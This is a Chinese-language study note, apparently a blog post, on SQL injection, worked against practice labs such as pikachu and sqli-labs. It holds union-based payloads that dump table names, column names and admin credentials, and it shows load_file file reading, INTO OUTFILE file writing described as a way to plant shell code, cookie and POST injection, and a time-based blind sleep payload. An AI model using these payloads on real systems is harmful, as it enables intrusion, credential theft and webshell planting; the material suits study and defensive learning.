<tr>
<td>Version</td>
<td>版本，默认值10</td>
</tr>
<tr>
<td>Row_format</td>
<td>行格式[Compact|Dynamic|Fixed]</td>
</tr>
<tr>
<td>Table_rows</td>
<td>表里所存多少行数据</td>
</tr>
<tr>
<td>Avg_row_length</td>
<td>平均行长度</td>
</tr>
<tr>
<td>Data_length</td>
<td>数据长度</td>
</tr>
<tr>
<td>Max_data_length</td>
<td>最大数据长度</td>
</tr>
<tr>
<td>Index_length</td>
<td>索引长度</td>
</tr>
<tr>
<td>Data_free</td>
<td>空间碎片</td>
</tr>
<tr>
<td>Auto_increment</td>
<td>做自增主键的自动增量当前值</td>
</tr>
<tr>
<td>Create_time</td>
<td>表的创建时间</td>
</tr>
<tr>
<td>Update_time</td>
<td>表的更新时间</td>
</tr>
<tr>
<td>Check_time</td>
<td>表的检查时间</td>
</tr>
<tr>
<td>Table_collation</td>
<td>表的字符校验编码集</td>
</tr>
<tr>
<td>Checksum</td>
<td>校验和</td>
</tr>
<tr>
<td>Create_options</td>
<td>创建选项</td>
</tr>
<tr>
<td>Table_comment</td>
<td>表的注释、备注</td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">--记录所有列明信息的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li></li>
</ul>
<table>
<thead>
<tr>
<th><strong>字段</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>table_schema</td>
<td>表所有者（对于schema的名称）</td>
</tr>
<tr>
<td>table_name</td>
<td>表名</td>
</tr>
<tr>
<td>column_name</td>
<td>列名</td>
</tr>
<tr>
<td>ordinal_position</td>
<td>列标识号</td>
</tr>
<tr>
<td>column_default</td>
<td>列的默认值</td>
</tr>
<tr>
<td>is_nullable</td>
<td>列的为空性。如果列允许 null，那么该列返回 yes。否则，返回 no</td>
</tr>
<tr>
<td>data_type</td>
<td>系统提供的数据类型</td>
</tr>
<tr>
<td>character_maximum_length</td>
<td>以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 null。有关更多信息，请参见数据类型</td>
</tr>
<tr>
<td>character_octet_length</td>
<td>以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 nu</td>
</tr>
<tr>
<td>numeric_precision</td>
<td>近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 null</td>
</tr>
<tr>
<td>numeric_precision_radix</td>
<td>近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 null</td>
</tr>
<tr>
<td>numeric_scale</td>
<td>近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 null</td>
</tr>
<tr>
<td>datetime_precision</td>
<td>datetime 及 sql-92 interval 数据类型的子类型代码。对于其它数据类型，返回 null</td>
</tr>
<tr>
<td>character_set_catalog</td>
<td>如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 null</td>
</tr>
<tr>
<td>character_set_schema</td>
<td>如果列是字符数据或 text 数据类型，那么返回 dbo，指明字符集的所有者名称。否则，返回 null</td>
</tr>
<tr>
<td>character_set_name</td>
<td>如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 null</td>
</tr>
<tr>
<td>collation_catalog</td>
<td>如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 null</td>
</tr>
<tr>
<td>collation_schema</td>
<td>返回 dbo，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 null</td>
</tr>
<tr>
<td>collation_name</td>
<td>如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 null。</td>
</tr>
<tr>
<td>domain_catalog</td>
<td>如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 null</td>
</tr>
<tr>
<td>domain_schema</td>
<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 null</td>
</tr>
<tr>
<td>domain_name</td>
<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL</td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span>schemata<span class="token comment">--记录mysql中所有数据库的名称的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>schema_name</td>
<td>数据库名称</td>
</tr>
<tr>
<td>default_character_set_name</td>
<td>数据库编码</td>
</tr>
<tr>
<td>default_collation_name</td>
<td>数据库排序规则</td>
</tr>
</tbody>
</table>
</blockquote>
<h3 id="6相关防注入"><a class="markdownIt-Anchor" href="#6相关防注入"></a> 6.相关防注入</h3>
<blockquote>
<p>1.自带防御，魔术引号，magic_qutotes_gpc=on</p>
<p>2.内置函数进行过滤，puh中如果确定数据类型，可以用is_int()判断是否为整数</p>
<p>3.自定义关键字过滤，如select关键字，大小写，编码</p>
<p>4.WAF防护软件：安全狗，宝塔，大部分都为过滤关键字</p>
</blockquote>
<p>limit x,y 进行x,y的筛选</p>
<h3 id="7案列"><a class="markdownIt-Anchor" href="#7案列"></a> 7案列</h3>
<p><strong>tables，columns这两个的应用</strong></p>
<h4 id="1爆出数据库的所有表"><a class="markdownIt-Anchor" href="#1爆出数据库的所有表"></a> （1）爆出数据库的所有表</h4>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>email form member <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'kobe'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'pikachu'</span>
<span class="token comment">--通过information_schema下的tables可以查询pikachu数据库下的所有表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="2爆出所有的列字段名"><a class="markdownIt-Anchor" href="#2爆出所有的列字段名"></a> （2）爆出所有的列(字段名)</h4>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>email form member <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'kobe'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_name<span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token string">'pikachu'</span>
<span class="token comment">--通过information_schema下的columns可以查询某个表下面的所有字段</span>
<span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="3跨站注入"><a class="markdownIt-Anchor" href="#3跨站注入"></a> （3）跨站注入</h4>
<blockquote>
<p>数据库A=网站A=数据库用户A</p>
<p>​               表名</p>
<p>​                          列名</p>
<p>​                                     数据</p>
<p>数据库B=网站B=数据库用户B</p>
<p>​         …</p>
<p><strong>特点A网站只操作A网站的数据库，B网站只操作B网站的数据库</strong></p>
<p>通过一个网站的数据库注入漏洞，注入另一个网站，条件：root型数据库</p>
<p><strong>通过A注入B</strong></p>
<blockquote>
<p>MySQL <code>GROUP_CONCAT()</code>函数将组中的字符串连接成为具有各种选项的单个字符串。中间用逗号隔开</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
<span class="token comment">#爆出MySQL中数据库表中的第一个数据库的名称，因为有LIMIT 0,1，所以是第一个</span>
<span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schamata
<span class="token comment">#显示MySQL中数据库表中所有数据库的名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>1)查看当前使用的数据库</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413074049.PNG" alt=""></p>
<p><strong>1）爆出所有数据库名字</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
<span class="token comment">#爆出MySQL中数据库表中所有数据库的名称，并且用逗号分割，也是应为limit的限制</span>
<span class="token comment">#因为users查询出来的是三个字段，所以联合查询查询出来的也是要是三个字段</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220412220749.PNG" alt=""></p>
<p><strong>2）爆出的bees数据库下的所有表</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'bees'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413073204.PNG" alt=""></p>
<p><strong>3)爆出bees数据库下的bees_admin表的所有字段</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'bees_admin'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413073638.PNG" alt=""></p>
<p><strong>4)获取指定数据</strong></p>
<p>获取用admin_name,admin_password两个字段的数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>admin_name<span class="token punctuation">,</span>admin_password <span class="token keyword">from</span> bees<span class="token punctuation">.</span>bees_admin <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
<span class="token comment">#注意后面要指定查询数据库下面的表bees.bees_admin，即bees数据库下的bees_admin表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413144436.PNG" alt=""></p>
</blockquote>
<h4 id="4文件读取"><a class="markdownIt-Anchor" href="#4文件读取"></a> （4）文件读取</h4>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/inetpub/target/sqlilabs/.txt'</span><span class="token punctuation">)</span>
<span class="token comment">#注意添加冒号与斜杠的写法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>[常见load_file()读取敏感文件](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">(18条消息) 常见的load_file()读取的敏感信息_weixin_30292843的博客-CSDN博客</a>)</p>
<p><strong>①文件读取的类型</strong></p>
<ul>
<li>读取服务器默认路径对应的文件</li>
<li>读取随机路径的文件（网站路径）</li>
</ul>
<p><strong>②路径获取的常见方法</strong></p>
<ul>
<li>报错显示（乱输入信息爆出一些文件路径），</li>
<li>遗留文件（站长调试时留下的文件），</li>
<li>漏洞报错（明确搭建的平台，搜索相关的漏洞，来获取文件的路径），</li>
<li>平台配置文件（读取读取配置信息来获取网站的文件的路径）</li>
<li>爆破（网站的常见路径，不同系统常见的路径，没办法的办法）</li>
</ul>
<p><strong>③文件的读取</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'C:/inetpub/target/sqlilabs/reds.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>读取的内容为：sqlreadfile</p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413152359.PNG" alt=""></p>
<p><strong>④文件的写入</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\inetpub\\target\\sqlilabs\\write.txt'</span><span class="token comment">-- LIMIT 0,1</span>
<span class="token comment">#注意后面有--注释，在url中要--+来进行注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>当把x的内容换成shell代码后就实现了恶意代码的植入</strong></p>
<ul>
<li>php魔术引号的过滤（内置安全开关）magic_qutotes_gpc(php的安装目录下面)</li>
</ul>
<blockquote>
<p>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，对__GET以及进行数据库操作的sql进行转义处理，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。防止sql注入</p>
<p>当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。这些转义是必须的。<br>
php中的magic_quotes_gpc是配置在php.ini中的</p>
<p>一、当PHP magic_quotes_gpc=on<br>
如果此时你对输入的数据作了addslashes()处理，<br>
那么在输出的时候就必须使用stripslashes()去掉多余的反斜杠。<br>
如果仅为magic_quotes_gpc=on，无再对写入数据库的字符串未经过任何处理。从数据库读出的字符串未作任何处理，则sql语句顺利执行，数据成功写入数据库，数据库保存格式和输出数据格式都和输入一样，不带反斜杠</p>
<p>二、当PHP magic_quotes_gpc=off<br>
必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出<br>
因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行。数据库保存格式和输出数据格式都和输入一样，不带反斜杠</p>
</blockquote>
<ul>
<li>效果</li>
</ul>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413214455.PNG" alt=""></p>
<ul>
<li>解决方法，对路劲进行编码，把路径进行hex（十六进制，不添加单引号）</li>
</ul>
<h2 id="三请求方法的注入"><a class="markdownIt-Anchor" href="#三请求方法的注入"></a> （三）请求方法的注入</h2>
<p>不同的请求方法获取的数据不同，明白数据的请求方法</p>
<h3 id="1-get数据写在url后面用相应的方式传递参数"><a class="markdownIt-Anchor" href="#1-get数据写在url后面用相应的方式传递参数"></a> 1. GET：数据写在URL后面，用相应的方式传递参数</h3>
<h3 id="2-post大数据提交的方式注入点在post"><a class="markdownIt-Anchor" href="#2-post大数据提交的方式注入点在post"></a> 2. POST：大数据提交的方式，注入点在post</h3>
<blockquote>
<p>除了在url中体提交，也可以在网页输入上提交，如果需要与数据库连接的化就可能会存在注入，数据需要抓包才能看见。</p>
<p>产生的地方，多半出现在登录框，查询框，等各种和数据库有交互的框数据。</p>
<p>提交方式，与参数类型（单引号，双引号的干扰）</p>
</blockquote>
<blockquote>
<p>案列</p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415170914.PNG" alt=""></p>
<p><strong>1)抓包结果可以看出，账户，密码的提交方式，猜测可能有注入点</strong></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415170958.PNG" alt=""></p>
<p><strong>2）判断注入为字符型注入</strong></p>
<p><strong>3）猜测字段数为2</strong></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415174009.PNG" alt=""></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415173440.PNG" alt=""></p>
<p><strong>4)联合查询，查询数据库名与数据库用户</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415174534.PNG" alt=""></p>
<p><strong>5）获取改数据下的所有表</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">-- 'and password='password' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415180003.PNG" alt=""></p>
<p><strong>6）获取emails表的字段(id,email_id两个字段)</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'emails'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415181000.PNG" alt=""></p>
<p><strong>7）获取数据</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>email_id <span class="token punctuation">)</span><span class="token keyword">from</span> emails<span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415181413.PNG" alt=""></p>
</blockquote>
<p><strong>Request接受</strong></p>
<p><strong>通过提交方式，绕过防护软件</strong></p>
<p><strong>php的SERVER[]全局变量，获取操作系统，用户IP，等</strong></p>
<h3 id="3cookie注入"><a class="markdownIt-Anchor" href="#3cookie注入"></a> 3.cookie注入</h3>
<blockquote>
<p>♦<strong>cookie注入的原理是：就要修改cookie的值，</strong></p>
<p>♦cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p>
<p>♦相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到<a target="_blank" rel="noopener" href="http://www.2cto.com/kf/ware/Java/">Java</a>script语言了。另外cookie注入的形</p>
<p>♦<strong>成有两个必须条件，</strong></p>
<p>**条件1是：**程序对get和post方式提交的数据进行了过滤，但未对cookie提交的<a target="_blank" rel="noopener" href="http://www.2cto.com/database/">数据库</a>进行过滤。</p>
<p>**条件2是：**在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</p>
<p><em><strong>*2.为什么要cookie注入？*</strong></em></p>
<p>****♦****主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/insane-Mr-Li/p/9142681.html">cookie注入原理详解（一） - tooltime - 博客园 (cnblogs.com)</a>)</p>
</blockquote>
<p><strong>案例，sqlilabs 第20关</strong></p>
<p><strong>1.代码审查</strong></p>
<p><em>1）在源代码中，如果没有设置cookie的uname的值，就会对post提交的uname与passwd进行过滤检查</em></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142237.PNG" alt=""></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142310.PNG" alt=""></p>
<p><em>2）如果设置cookie的uname值，并且没有设置submit，则在cookie中进行sql查询</em></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142326.PNG" alt=""></p>
<p><em>3）如果设置cookie的uname值，且设置submit，则输出" Your Cookie is deleted";</em></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142338.PNG" alt=""></p>
<p><strong>2.抓波修改cookie的值，并把submit删除，进行测试</strong></p>
<p><strong>1)输入一个用户名和密码，点击提交，进行抓包。</strong></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145857.PNG" alt=""></p>
<p><strong>2）没更改cookie时的数据包</strong></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416150440.PNG" alt=""></p>
<p><strong>3).删除submit与更改cookie值，判断字段数（为3）</strong></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145929.PNG" alt=""></p>
<p><strong>4).查询想要的字段</strong></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145952.PNG" alt=""></p>
<p><strong>结果，数据库的名称为security，</strong></p>
<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416150029.PNG" alt=""></p>
<p><strong>5）就可以根据现有的注入点进行，暴库了</strong></p>
<h3 id="4-json提交数据的注入"><a class="markdownIt-Anchor" href="#4-json提交数据的注入"></a> 4 json提交数据的注入</h3>
<p><strong>一、Json简介</strong><br>
JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json”。</p>
<p><strong>json语法</strong><br>
数据在名称/值对中<br>
数据由逗号分隔<br>
大括号保存对象<br>
中括号保存数组<br>
<strong>JSON 值</strong><br>
JSON 值可以是：</p>
<p>数字（整数或浮点数）  {“age”:30 }<br>
字符串（在双引号中）  {“uname”:“yang”}<br>
逻辑值（true 或 false） {“flag”:true }<br>
数组（在中括号中）{“sites”:[{“name”:“yang”},{“name”:“ming”}]}<br>
对象（在大括号中）JSON 对象在大括号（{}）中书写：<br>
null    { “runoob”:null }</p>
<h2 id="四sql-server注入"><a class="markdownIt-Anchor" href="#四sql-server注入"></a> （四）SQL server注入</h2>
<p><strong>1.利用错误消息提取信息</strong>,having</p>
<blockquote>
<p>SQL Server 数据库是一个非常优秀的数据库，它可以准确地定位错误信息，这对攻击者来说是一件十分 美好的事情，因为攻击者可以通过错误消息提取自己想要的数据。</p>
</blockquote>
<p><strong>having的特点</strong></p>
<blockquote>
<p>1.having子句是用来对分组之后的信息进行过滤，在使用having时通常都会先使用group by。</p>
<p>2.having子句出现的字段必须的是分组之后的组的整体信息，having子句不允许出现组内的详细信息</p>
<p>3.having和where的异同:</p>
<p>相同:<br>
都是对数据过滤，只保留有效的数据；<br>
where和having一样，  都不允许出现字段的别名；<br>
只允许出现最原始的字段的名字。</p>
<p>不同:<br>
where是对原始的记录过滤having是对分组之后的记录过滤；<br>
where必须的写在having的前面，顺序不可颠倒否则运行出错。</p>
<p>4.利用having的报错可以爆出表名与字段名</p>
</blockquote>
<h2 id="五access数据库"><a class="markdownIt-Anchor" href="#五access数据库"></a> （五）access数据库</h2>
<h3 id="1特点"><a class="markdownIt-Anchor" href="#1特点"></a> 1.特点</h3>
<ul>
<li>access</li>
</ul>
<p>​                 表名</p>
<p>​                         列明</p>
<p>​                                 数据</p>
<ul>
<li>没有数据库，access就相当于数据库，其他数据库比access要高级</li>
<li>没有内置方法</li>
<li>在asp网站中，数据库保存在当前的文件目录下</li>
</ul>
<h3 id="2注入"><a class="markdownIt-Anchor" href="#2注入"></a> 2.注入</h3>
<ul>
<li>只能是猜数据表和字段的名称，通过字典来跑</li>
</ul>
<h2 id="六盲注sql本身查询方式insertupdate等或者网站过滤"><a class="markdownIt-Anchor" href="#六盲注sql本身查询方式insertupdate等或者网站过滤"></a> （六）盲注（sql本身查询方式insert,update等，或者网站过滤）</h2>
<h3 id="1基于布尔的逻辑判断"><a class="markdownIt-Anchor" href="#1基于布尔的逻辑判断"></a> 1.基于布尔的逻辑判断</h3>
<h3 id="2基于时间的延时判断"><a class="markdownIt-Anchor" href="#2基于时间的延时判断"></a> 2.基于时间的延时判断</h3>
<p><strong>if,sleep。if(条件,A,B)条件成立返回A，不成立返回B</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> member <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#根据页面的加载时间判断数据库，不需要回显</span>
